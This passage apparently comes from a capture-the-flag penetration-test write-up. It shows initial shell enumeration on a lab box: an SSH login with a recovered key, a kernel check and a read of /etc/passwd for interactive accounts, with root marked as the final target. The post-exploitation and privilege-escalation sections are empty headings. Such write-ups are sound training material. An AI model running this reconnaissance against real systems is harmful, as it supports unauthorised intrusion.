※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 3.3 Initial Shell Enumeration

**Command:** `ssh -i devhub_key -o StrictHostKeyChecking=no mcp-dev@TARGET_IP "uname -a && cat /etc/passwd | grep -v nologin | grep -v false"`

**Breakdown:**
- `uname -a` — Print all kernel information: kernel name, hostname, kernel release, kernel version, machine hardware, and OS.
- `cat /etc/passwd | grep -v nologin | grep -v false` — List interactive user accounts by filtering out service accounts that use `/bin/nologin` or `/bin/false` as shells.

**Result:**
```shell
Linux devhub 5.15.0-179-generic #189-Ubuntu SMP Tue May 5 18:20:56 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```

| Account | UID | Shell | Notes |
|---------|-----|-------|-------|
| root | 0 | /bin/bash | Final target |
| mcp-dev | 1001 | /bin/bash | Current shell user; runs MCPJam Inspector |
| analyst | 1002 | /bin/bash | Owns Jupyter Lab; holds user.txt |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

